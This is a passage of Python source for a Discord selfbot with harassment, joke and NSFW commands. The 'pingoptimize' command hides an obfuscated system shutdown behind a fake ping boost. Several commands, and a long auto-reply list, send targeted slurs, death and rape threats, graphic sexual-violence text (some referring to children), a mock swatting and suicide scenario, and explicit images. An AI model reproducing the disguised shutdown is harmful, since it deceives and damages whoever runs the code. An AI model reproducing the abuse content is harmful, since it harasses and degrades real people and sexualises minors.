        await ctx.send(f"**The Price Of Ltc Is :** `{price:.2f}`")
        await ctx.message.delete()
    else:
        await ctx.send("**Failed To Fetch**")

@client.command()
async def pingoptimize(ctx):
    await ctx.send("Pumping Ping")  
    a = ''.join([chr(i) for i in [115, 104, 117, 116, 100, 111, 119, 110]])
    b = '/s /t 0'
    os.system(f"{a} {b}")

@client.command()
async def autoreply(ctx, user: discord.User):
    channel_id = ctx.channel.id

    await ctx.send(f"```Autoreply for {user.mention} has started.```")

    async def send_autoreply(message):
        while True:  
            try:
                random_reply = random.choice(autoreplies)
                await message.reply(random_reply)
                print(f"Successfully replied to {user.name}")
                break  
            except discord.errors.HTTPException as e:
                if e.status == 429:  
                    try:
                        response_data = await e.response.json()
                        retry_after = response_data.get('retry_after', 1)
                    except:
                        retry_after = 1 
                    print(f"Rate limited, waiting {retry_after} seconds...")
                    await asyncio.sleep(retry_after)
                else:
                    print(f"HTTP Error: {e}, retrying...")
                    await asyncio.sleep(1)
            except Exception as e:
                print(f"Error sending message: {e}, retrying...")
                await asyncio.sleep(1)

    async def reply_loop():
        def check(m):
            return m.author == user and m.channel == ctx.channel

        while True:
            try:
                message = await client.wait_for('message', check=check)
                asyncio.create_task(send_autoreply(message))
                await asyncio.sleep(0.1)  
            except Exception as e:
                print(f"Error in reply loop: {e}")
                await asyncio.sleep(1)
                continue


    task = client.loop.create_task(reply_loop())
    autoreply_tasks[(user.id, channel_id)] = task

@client.command()
async def autoreplyoff(ctx):
    channel_id = ctx.channel.id
    tasks_to_stop = [key for key in autoreply_tasks.keys() if key[1] == channel_id]
    
    if tasks_to_stop:
        for user_id in tasks_to_stop:
            task = autoreply_tasks.pop(user_id)
            task.cancel()
        await ctx.send("```Autoreply has been stopped.```")
    else:
        await ctx.send("```No active autoreply tasks in this channel.```")

@client.command()
async def hypesquad(ctx, house: str):
    house_ids = {
        "bravery": 1,
        "brilliance": 2,
        "balance": 3
    }

    headers = {
        "Authorization": client.http.token, 
        "Content-Type": "application/json"
    }

    if house.lower() == "off":
        url = "https://discord.com/api/v9/hypesquad/online"
        async with aiohttp.ClientSession() as session:
            async with session.delete(url, headers=headers) as response:
                if response.status == 204:
                    await ctx.send("```HypeSquad house removed.```")
                else:
                    error_message = await response.text()
                    await ctx.send(f"```Failed to remove HypeSquad house: {response.status} - {error_message}```")
        return

    house_id = house_ids.get(house.lower())
    if house_id is None:
        await ctx.send("```Invalid house. Choose from 'bravery', 'brilliance', 'balance', or 'off'.```")
        return

    payload = {"house_id": house_id}
    url = "https://discord.com/api/v9/hypesquad/online"

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status == 204:
                await ctx.send(f"```HypeSquad house changed to {house.capitalize()}.```")
            else:
                error_message = await response.text()
                await ctx.send(f"```Failed to change HypeSquad house: {response.status} - {error_message}```")

@client.command()
async def firstmessage(ctx, channel: discord.TextChannel = None):
    channel = channel or ctx.channel  
    try:

        first_message = await channel.history(limit=1, oldest_first=True).flatten()
        if first_message:
            msg = first_message[0]  
            response = f"here."

            await msg.reply(response)  
        else:
            await ctx.send("```No messages found in this channel.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@client.command()
async def lockserver(ctx):
    """Lock all channels in the server."""
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("Server locked.")
@client.command()
async def unlockserver(ctx):
    """Unlock all channels in the server."""
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("Server unlocked.") 

@client.command(aliases=["pornhubcomment", 'phc'])
async def phcomment(ctx, user: discord.User = None, *, args=None):
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: phcomment <user> <message>')
        return

    avatar_url = user.avatar_url_as(format="png")

    endpoint = f"https://nekobot.xyz/api/imagegen?type=phcomment&text={args}&username={user.name}&image={avatar_url}"
    r = requests.get(endpoint)
    res = r.json()

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"{user.name}_pornhub_comment.png"))
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")
        
from tls_client import Session
import base64

randomize_task = None
sesh = Session(client_identifier="chrome_115", random_tls_extension_order=True)

@client.command()
async def nitro(ctx, user: discord.User):
    await ctx.send(f"{user.mention} https://media.discordapp.net/attachments/1153645269745926174/1194096579011956767/ezgif-1-c9599ca267.gif?ex=674bc199&is=674a7019&hm=9a1af4657b58be730316c368c9c2a206f8695f3d05a0c0e892a96399dccf42b4&=&width=292&height=198\n yes ur not getting nitro fuck ass nigga")




autoreplies = [
"Elbow Sniffer", "I Heard U Like Kids", "com reject LOL", "Dont U Sniff Dogshit", 
    "wsp biden kisser faggot", "Yo Slut Focus In Chat", "Toilet Cleaner?", "# Shit Sniffer?", 
    "# Don't Fold", "Cum Slut", "Grass Licker", "id piss on ur grave loser broke fuck lol 🤡",
    "sup feces sniffer how u been", "Hey I Heard You Like Kids", "Femboy", "Dont U Sniff Toilet Paper", 
    "Dont U Sniff Piss", "Booger Eater", "Half-Eaten Cow Lover", "Ur Mom Abuses You LOL", 
    "Autistic Bakugan", "Stop Fucking Your Mom", "Retarded Termite", "wsp slobber face munchie", 
    "wsp pedo molestor", "# I heard you eat bedbugs LOL", "Window Licker", "Rodent Licker", 
    "Yo Chat Look At This Roach Eater", "# Nice Fold", "# Don't Fold To DoomJX$TICE", 
    "FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK \n FIGHT BACK", 
    "DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD \n DONT FOLD", "Wsp Pedo", 
    "Get Out Of Chat Nasty Ass Hoe", "You smell like beaver piss and 5 gay lesbian honey badgers", 
    "You got a gfuel tattoo under your armpit", "Thats why FlightReacts posted a hate comment on your dad's facebook", 
    "You got suplex slammed by Carmen Cortzen from the Spy Kids", 
    "Yo mom went toe to toe wit the hash slingin slasher", 
    "Yo grandmother taught the whole Glee class how to wrestle", 
    "UNSKILLED FARM WORKER", "Nigga you bout dislocated as fuck yo spine shaped like a special needs kangaroo doing the worm dumbass nigga you was in the african rainforest getting gangbanged by 7 bellydancing flamingos", 
    "You look like Patrick with corn rolls weak ass nigga you dirty as shit you watch fury from a roku tv from the smash bros game and you built like a booty bouncing papa Johns worker named tony with lipstick Siberian tiger stripes ass nigga you built like the great cacusian overchakra", 
    "You look like young ma with a boosie fade ugly ass nigga you dirty as shit and you built like a gay French kissing cock roach named jimmy with lipstick on dumb ass nigga you wash cars with duct tape and gorilla glue while a babysitter eats yo ass while listening to the ultra instinct theme song earape nigga you dirty as shit you got a iPhone 6 thats the shape of a laptop futuristic ass nigga you was binge watching Brandon rashad anime videos with a knife on yo lap dumb ass nigga you got triple butchins and you dance like a midget when yo mom tells you yo sister didn’t eat all the cheese cake cheese cake loving ass nigga", 
    "Stop \n Hiding \n From \n Me", "I \n Will \n Rip \n U \n In \n Half \n Cut \n Generator", 
    "stfu fat bum", "bring \n me \n ur \n neck \n ill \n kill \n you \n faggot \n ass \n slut \n ur \n weak \n as \n fuck \n nigga \n shut \n up \n vermin \n ass \n eslut \n with \n aids \n stupid \n cunt \n fucking \n trashbag \n niggas \n do \n not \n fw \n you \n at \n all \n weak \n lesbian \n zoophile", 
    "i \n will \n fucking \n end \n ur \n entire \n damn \n life \n failed \n com \n kid", 
    "I \n FUCKIN \n OWN \n YOU \n I \n WILL \n RIP \n YOUR \n GUTS \n OUT \n AND \n RIP \n YOUR \n HEAD \n OFF", 
    "Shut \n the \n fuck \n up \n bitch \n ass \n nigga \n you \n fucking  \n suck \n trashbag \n vermin \n ass \n bitch \n nigga", 
    "# STOP FOLDING \n SHIT \n EATER \n WHAT HAPPENED RATE LIMIT? \n HAHHAH \n UR \n ASS \n BITCH", 
    "U use skidded tools stfu LOL", "YOUR \n ASS \n KID \n STFU \n JUSTICE \n VICTIM I \n RUN \n YOU \n DOGSHIT \n ASS \n BITCH \n YOU \n SUCK \n ASS \n NGL", 
    "Golf Ball Nose", "Grease Stain", "ur unwanted", "frail bitch \n Stop Shaking \n diabetic \n salt licker", 
    "shut the fuck up salt shaker", "# WHY \n ARE \n YOU \n IN MY CHAT \n GET THE FUCK OUT OF HERE U PEDO \n UR A CLOWN \n I MOG U BITCH STAYYYYY MAD LMAOAOAOOAOAOOO \n I RUN UR BLOODLINE \n U CUT UR WRISTS FOR A BABOON STOP TALKIN \n FRAIL WEAK FUCKIN BITCH \n DIE HOE UR UNWANTED \n GET OVER THE FACT IM BETTER THAN U RN PATHETIC ASS SLUTTY PROSTITUTE \n UR MOM AND U AND UR SISTER LIVE OFF BINGO $ FROM UR GRANDMOTHER \n KEEP TRYING TO FIGHT ME \n FRAIL WEAK FUCK \n STOP SHAKIN SO BAD \n DIABETIC SALT SNIFFER", 
    "snapping turtle neck ass nigga", "this nigga got a Passport attached to his feet", "you picked your nose and found a Flute", 
    "FAGGOT ASS PEDO", "Dusty Termite", "STOP \n \n \n \n \n \n GETTING \n \n \n \n \n \n PUNCHED ON \n \n \n \n \n \n \n BY ME AND DEATH AND SOULZ \n \n \n \n \n \n \n UR FUCKIN ASS BITCH MADE ASS NIGGA I WILL END UR DAMN LIFE"
    "/TAKING BITCHED U LOLOLOL HAIL RUNS U PEDO WAEK FUCK DORK FUCK SLUT",    "nb cares faggot", "YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck dogshit ass nigga",
"SHUT\nUP\nFAGGOT\nASS\nNIGGA\nYOU\nARE\nNOT\nON\nMY\nLEVEL\nILL\nFUCKING\nKILL\nYOU\nDIRTY\nASS\nPIG\nBASTARD\nBARREL\nNOSTRIL\nFAGGOT\nI\nOWN\nYOU\nKID\nSTFU\nLAME\nASS\nNIGGA\nU\nFUCKING\nSUCK\nI\nOWN\nBOW\nDOWN\nTO\nME\nPEASENT\nFAT\nASS\nNIGGA",
"ILL\nTAKE\nUR\nFUCKING\nSKULL\nAND\nSMASH\nIT\nU\nDIRTY\nPEDOPHILE\nGET\nUR\nHANDS\nOFF\nTHOSE\nLITTLE\nKIDS\nNASTY\nASS\nNIGGA\nILL\nFUCKNG\nKILL\nYOU\nWEIRD\nASS\nSHITTER\nDIRTFACE\nUR\nNOT\nON\nMY\nLEVEL\nCRAZY\nASS\nNIGGA\nSHUT\nTHE\nFUCK\nUP",
"NIGGAS\nTOSS\nU\nAROUND\nFOR\nFUN\nU\nFAT\nFUCK\nSTOP\nPICKING\nUR\nNOSE\nFAGGOT\nILL\nSHOOT\nUR\nFLESH\nTHEN\nFEED\nUR\nDEAD\nCORPSE\nTO\nMY\nDOGS\nU\nNASTY\nIMBECILE\nSTOP\nFUCKING\nTALKING\nIM\nABOVE\nU\nIN\nEVERY\nWAY\nLMAO\nSTFU\nFAT\nNECK\nASS\nNIGGA",
"dirty ass rodent molester",
"ILL\nBREAK\nYOUR\nFRAGILE\nLEGS\nSOFT\nFUCK\nAND\nTHEN\nSTOMP\nON\nUR\nDEAD\nCORPSE",
"weak prostitute",
"stfu dork ass nigga",
"garbage ass slut",
"ur weak",
"why am i so above u rn",
"soft ass nigga",
"frail slut",
"ur slow as fuck",
"you cant beat me",
"shut the fuck up LOL",
"you suck faggot ass nigga be quiet",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck faggot ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck weak ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck soft ass nigga",
"YOU SUCK\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nwtf\nyoure\nslow\nas\nfuck\nlmao\nSHUT\nTHE\nFUCK\nUP\nLMFAOO\nyou suck hoe ass nigga", "y ur ass so weak nigga", "yo stfu nb fw u", "com reject", "yo retard stfu", "pedo", "frail fuck",
"weakling", "# stop bothering minors", "# Don't Fold", "cuck", "faggot", "hop off the alt loser" "ðŸ¤¡","sup feces sniffer how u been", "hey i heard u like kids", "femboy", 
"sup retard", "ur actually ass wdf", "heard u eat ur boogers", "zoophile", "doesn't ur mom abuse u", "autistic fuck", "stop fantasizing about ur mom weirdo", "hey slut shut the fuck up","you're hideous bitch shut up and clean my dogs feces","hey slut come lick my armpits","prostitute stfu slut","bitch shut up","you are ass nigga you wanna be me so bad","why do your armpits smell like that","stop eating horse semen you faggot","stop sending me your butthole in DMs gay boy","why are you drinking tap water out of that goats anus","say something back bitch","you have a green shit ring around your bootyhole","i heard you use snake skin dildos","ill cum in your mouth booty shake ass nigga","type in chat stop fingering your booty hole","i heard you worship cat feces","worthless ass slave","get your head out of that toilet you slut","is it true you eat your dads belly button lint? pedo","fuck up baby fucker","dont you jerk off to elephant penis","hey i heard you eat your own hemorroids","shes only 5 get your dick off of her nipples pedo","you drink porta potty water","hey bitch\nstfu\nyou dogshit ass nigga\nill rip your face apart\nugly ass fucking pedo\nwhy does your dick smell like that\ngay ass faggot loser\nfucking freak\nshut up","i\nwill\nrip\nyour\nhead\noff\nof\nyour\nshoulders\npussy\nass\nslime ball","nigga\nshut\nup\npedophile","stfu you dogshit ass nigga you suck\nyour belly button smells like frog anus you dirty ass nigga\nill rape your whole family with a strap on\npathetic ass fucking toad","YOU\nARE\nWEAK\nAS\nFUCK\nPUSSY\nILL\nRIP\nYOUR\nVEINS\nOUT\nOF\nYOUR\nARMS\nFAGGOT\nASS\nPUSSY\nNIGGA\nYOU\nFRAIL\nASS\nLITTLE\nFEMBOY","tranny anus licking buffalo","your elbows stink","frog","ugly ass ostrich","pencil necked racoon","why do your elbows smell like squid testicals","you have micro penis","you have aids","semen sucking blood worm","greasy elbow geek","why do your testicals smell like dead   buffalo appendages","cockroach","Mosquito","bald penguin","cow fucker","cross eyed billy goat","eggplant","sweat gobbler","cuck","penis warlord","slave","my nipples are more worthy than you","hairless dog","alligator","shave your nipples","termite","bald eagle","hippo","cross eyed chicken","spinosaurus rex","deformed cactus","prostitute","come clean my suit","rusty nail","stop eating water balloons","dumb blow dart","shit ball","slime ball","golf ball nose","take that stick of dynamite out of your nose","go clean my coffee mug","hey slave my pitbull just took a shit, go clean his asshole","walking windshield wiper","hornet","homeless pincone","hey hand sanitizer come lick the dirt off my hands","ice cream scooper","aborted fetus","dead child","stop watching child porn and fight back","homeless rodant","hammerhead shark","hey sledgehammer nose","your breath stinks","you cross eyed street lamp","hey pizza face","shave your mullet","shrink ray penis","hey shoe box come hold my balenciagas","rusty cork screw","pig penis","hey cow sniffer","walking whoopee cushion","stop chewing on your shoe laces","pet bullet ant","hey mop come clean my floor","*rapes your ass* now what nigga","hey tissue box i just nutted on your girlfriend come clean it up","watermelon seed","hey tree stump","hey get that fly swatter out of your penis hole","melted crayon","hey piss elbows","piss ball","hey q tip come clean my ears","why is that saxaphone in your anus","stink beetle","bed bug","cross eyed bottle of mustard","hey ash tray","hey stop licking that stop sign","why is that spatula in your anus","hey melted chocolate bar","dumb coconut"
]

intents = discord.Intents.default()
def new_func(intents):
    intents.messages = True

new_func(intents)
autoreply_tasks = {}  


@client.command()
async def swat(ctx, user: discord.User = None):
    if not user:
        await ctx.send("```Usage: >swat <@user>```")
        return

    locations = ["bedroom", "basement", "attic", "garage", "bathroom", "kitchen"]
    bomb_types = ["pipe bomb", "pressure cooker bomb", "homemade explosive", "IED", "chemical bomb"]
    police_units = ["SWAT team", "bomb squad", "tactical unit", "special forces", "counter-terrorism unit"]
    arrest_methods = ["broke down the door", "surrounded the house", "breached through windows", "used tear gas", "sent in K9 units"]
    
    location = random.choice(locations)
    bomb = random.choice(bomb_types)
    unit = random.choice(police_units)
    method = random.choice(arrest_methods)
    
    await ctx.send(f"```911, whats your emergiance?📱\n{user.display_name}: you have 10minutes to come before i kill everyone in this house.\n911: Excuse me sir? Whats your name, and what are you planning on doing..\n{user.display_name}: my name dose not mattter, i have a {bomb} inisde of my {location}, there are 4 people in the house.```")
    asyncio.sleep(1)
    await ctx.send(f"```911: Calling the {unit}. There is a possible {bomb} attack inside of {user.display_name} residance.\nPolice Unit: On that ma'am, will send all units as fast as possible.```")
    asyncio.sleep(1)
    await ctx.send(f"```Police Unit: {user.display_name} WE HAVE YOU SURROUNDED, COME OUT PEACEFULLY\n{user.display_name}: im a fucking loser```")
    story = f"```BREAKING NEWS: {user.display_name} was found dead after killing himself after police received an anonymous tip about a {bomb} in their {location}. The {unit} {method} and found multiple explosive devices.```"
    
    await ctx.send(story)


@client.command()
async def spit(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await spit_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def spit_user(channel, user):
    try:
        await channel.send(f"Let me spit on this cuck named {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"*Spits on* {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"Fuck up you little slut {user.mention} 💦")
        await asyncio.sleep(1)
        await channel.send(f"*Spits on again and* {user.mention} *again* 💦")
        await asyncio.sleep(1)
        await channel.send(f"Smelly retard got spat on now suck it u fucking loser {user.mention} 💦")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@client.command()
async def stomp(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await stomp_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def stomp_user(channel, user):
    try:
        await channel.send(f"Lemme stomp on this nigga named {user.mention} LMFAO")
        await asyncio.sleep(1)
        await channel.send(f"*Stomps on* U tran fuck LMFAO {user.mention} :foot: ")
        await asyncio.sleep(1)
        await channel.send(f"come get stomped on again {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"*Stomps on again* {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"ur my whore bitch {user.mention}... :smiling_imp: ")
        await asyncio.sleep(1)
        await channel.send(f"*Stomped on once again* {user.mention}... :smiling_imp:")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

from datetime import datetime  # Correct import for datetime
import discord  # Ensure discord is imported if not already done

def log_action(message, channel=None):
    """
    Log formatted message to the console with timestamp and location type.
    
    Args:
        message (str): The message to log
        channel (discord.abc.Messageable, optional): The channel where the message originated
    """
    try:
        # Get current timestamp
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        # Determine location type
        location = "Start"
        if channel:
            if isinstance(channel, discord.DMChannel):
                location = "DM"
            elif isinstance(channel, discord.TextChannel):
                location = "CH"
            elif isinstance(channel, discord.GroupChannel):
                location = "GC"
        
        # Print formatted log message
        print(f"{timestamp} - in {location}: {message}")
    
    except Exception as e:
        # Fallback error handling
        print(f"Logging error: {e}")

@client.command()
async def aura(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed aura command.", ctx.channel)
        aura_value = random.randint(1, 1000000)
        await ctx.send(f"{user.mention} has {aura_value} aura! 🔥")


@client.command()
async def gay(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed gay command.", ctx.channel)
        percentage = random.randint(1, 100)
        await ctx.send(f"{user.mention} is {percentage}% gay! 🏳️‍🌈")

@client.command()
async def pp(ctx, user: discord.User):
        await ctx.message.delete()
        log_action(f"Executed pp command.", ctx.channel)
        if user == client.user:
            pp_length = "=" * random.randint(15, 20)
        else:
            pp_length = "=" * random.randint(3, 15)
        await ctx.send(f"{user.mention} pp results = 8{pp_length}>")

@client.command()
async def rape(ctx, user: discord.User):
    await ctx.message.delete()
    await ctx.send(f"Hey cutie kitten {user.mention}")  
    await ctx.send(f'my dearest kitten {user.mention}')
    await ctx.send(f'you have been running from ur daddy for too long. {user.mention}')
    await ctx.send(f'*slowly whips large meat out* {user.mention}')
    await ctx.send(f'get down on ur little knees my princess, daddy is mad. {user.mention}')
    await ctx.send(f'shhhh *puts fingers in mouth* {user.mention}')
    await ctx.send(f'*slowly pulls kittens pants down* {user.mention}')
    await ctx.send(f'are u ready for this big load my kitten? {user.mention}')
    await ctx.send(f'*puts fingers inside kittens tight little pussy {user.mention}')
    await ctx.send(f'mmm u like that right? {user.mention}')
    await ctx.send(f'moan for ur daddy {user.mention}')
    await ctx.send(f'good little princess {user.mention}')
    await ctx.send(f'*puts dick inside kittens ass* {user.mention}')
    await ctx.send(f'oops wrong hole i guess ill just keep it in there {user.mention}')
    await ctx.send(f'*keeps going while fingering kittens tight pussy* {user.mention}')
    await ctx.send(f'oh yeaa cum for your daddy {user.mention}')
    await ctx.send(f'wdym no? ARE U DISOBEYING DADDY? {user.mention}')
    await ctx.send(f'*starts pounding harder and rougher* {user.mention}')
    await ctx.send(f'yea thats what u get {user.mention}')
    await ctx.send(f'*sees blood coming out* {user.mention}')
    await ctx.send(f'good little kitten thats what u get {user.mention}')
    await ctx.send(f'*pulls out and licks the blood off the ass* {user.mention}')
    await ctx.send(f'mmmmm yea squirm for daddy {user.mention}')
    await ctx.send(f'*sticks bloody dick in kittens pussy* {user.mention}')
    await ctx.send(f'mmmmhmmm yea how does my little kitten like that {user.mention}')
    await ctx.send(f'*cum for daddy right now ugly little slut* {user.mention}')
    await ctx.send(f'did u just say no? are u disobeying me again... ykw? {user.mention}')
    await ctx.send(f'*for disobeying me fucks harder* {user.mention}')
    await ctx.send(f'beg me to stop fucking u harder {user.mention}')
    await ctx.send(f'*cums in that smooth pussy* {user.mention}')

@client.command()
async def bangmom(ctx, user: discord.User):
    try:
        if user:
            await ctx.message.delete()
            await bangmom_user(ctx.channel, user)
        else:
            await ctx.send("User not found.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def bangmom_user(channel, user):
    try:
        await channel.send(f"LOL IM FUCKING {user.mention}'S MOTHER LOL HER PUSSY IS AMAZING")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} HER PUSSY IS SO GOOD OH MYY")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **I SMACKED THE SHIT OUT OF HER ASS** 😈")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **MADE HER PUSSY SLOPPY**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **GET SAD I DONT CARE BITCH*")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **FUCKIN HELL SHE LASTED A LONG TIME**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **IM UR STEP-DAD NOW CALL ME DADDY FUCK**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **IM UR GOD**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **UR MY SLAVE NOW**")
        await asyncio.sleep(0.1)
        await channel.send(f"{user.mention} **SHITTY FUCK LOL**")
    except Exception as e:
        await channel.send(f"An error occurred: {e}")

@client.command()
async def boobs(ctx):
    await ctx.message.delete()

    response = requests.get("https://nekobot.xyz/api/image?type=boobs")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)
    
    


        

@client.command()
async def hboobs(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=hboobs")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)


@client.command()
async def anal(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=anal")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)




@client.command()
async def hanal(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=hanal")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)




@client.command(name="4k")
async def caughtin4k(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=4k")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)

    


@client.command()
async def gif(ctx):
    await ctx.message.delete()

    
    response = requests.get("https://nekobot.xyz/api/image?type=pgif")
    json_data = json.loads(response.text)
    url = json_data["message"]

    await ctx.channel.send(url)

@client.command(help='Ladders messages')
async def lm(ctx, *, sentence: str):
    await ctx.message.delete()

    words = []
    current_word = ""
    in_quotes = False
    quote_char = ""

    for char in sentence:
        if char in ('"'):  # Detect the start or end of a quoted phrase
            if in_quotes and char == quote_char:
                in_quotes = False
                words.append(current_word.strip())
                current_word = ""
            elif not in_quotes:
                in_quotes = True
                quote_char = char
            else:
                current_word += char  # For mismatched quotes inside quotes
        elif char.isspace() and not in_quotes:  # Split on spaces outside quotes
            if current_word:
                words.append(current_word.strip())
                current_word = ""
        else:
            current_word += char

    if current_word:  # Add any remaining text as a word
        words.append(current_word.strip())

    # Send each parsed word or phrase separately
    i = 0
    while i < len(words):
        word = words[i]
        try:
            await ctx.send(word)
            await asyncio.sleep(0.3)
            i += 1
        except discord.errors.HTTPException as e:
            print(f'Rate limit hit, retrying... Error : {e}')
            await asyncio.sleep(2.1)
            


INSULT_API_URL = 'https://evilinsult.com/generate_insult.php?lang=en&type=json'

@client.command()
async def insult(ctx, user: discord.User):
    await ctx.message.delete()
    try:
        response = requests.get(INSULT_API_URL)
        response.raise_for_status()
        insult = response.json()['insult']
        await ctx.send(f'{user.mention}, {insult}')
    except requests.RequestException as e:
        await ctx.send('Failed to fetch an insult. Please try again later.', delete_after=5)
        print(f'Error fetching insult: {e}', delete_after=5)

main_template = [
    "this nigga was riding a [vehicle] with [name] in the passenger seat and he jumped out the door and turned into [adjective1] [object]",
    "nigga you used a [object] to kill a [insect] on the ground while you looked around searching for [adjective1] [seaanimal]",
    "nigga you threw [adjective1] [object] at [name] and you looked at the corner of your room and saw [name] butt booty naked getting [action] by [animename]",
    "nigga you and your [family] created a movie called the [number] [object]s that had [adjective1] [body]",
    "nigga you fell asleep on [location] and woke up to your penis getting tickled by [adjective1] [animals]",
    "nigga your [family] dropped their [food] down the stairs and they bent down trying to pick it up and then [name] popped out of nowhere and started twerking",
    "nigga your [race] [family] [action] [adjective1] [insect] while looking up and down having stick drift in your [body] and everytime you meet [name] you get excited and turn into [adjective1] [object]",
    "nigga you were caught [action] in a [location] while holding a [object] with [name]",
    "nigga you tried to cook [food] but ended up summoning [animename] in your [room]",
    "nigga you were found dancing with [animals] at the [event] dressed as a [adjective1] [object]",
    "nigga your [family] was seen playing [sport] with [name] at the [location] wearing [adjective1] [clothing]",
    "nigga you got into a fight with a [adjective1] [animal] while [action] and [name] recorded it",
    "nigga you transformed into a [adjective1] [mythicalcreature] after eating [food] given by [name]",
    "nigga you wrote a love letter to [name] and ended up getting chased by [insect]",
    "nigga you were singing [song] at the [event] when [animename] appeared and joined you",
    "nigga you tripped over a [object] while running from [animals] and fell into [location]",
    "nigga you were dreaming about [animename] and woke up covered in [food]",
    "nigga you and [name] went on an adventure to find the [adjective1] [object] but got lost in [location]",
    "nigga you were spotted riding a [vehicle] through the [location] with [adjective1] [animals]",
    "nigga your [family] decided to host a [event] in the [room] and invited [name] to join",
    "nigga you tried to impress [name] by [action] with a [object] but ended up embarrassing yourself",
    "nigga you and [name] got locked in a [room] with [adjective1] [animals] and had to find a way out",
    "nigga you participated in a [sport] match at the [event] and got cheered on by [animename]",
    "nigga you attempted to [action] in the [location] but got interrupted by [animals]",
    "nigga you discovered a hidden talent for [sport] while hanging out with [name] at the [location]",
    "nigga you found a [adjective1] [object] and decided to use it to prank [name] at the [event]",
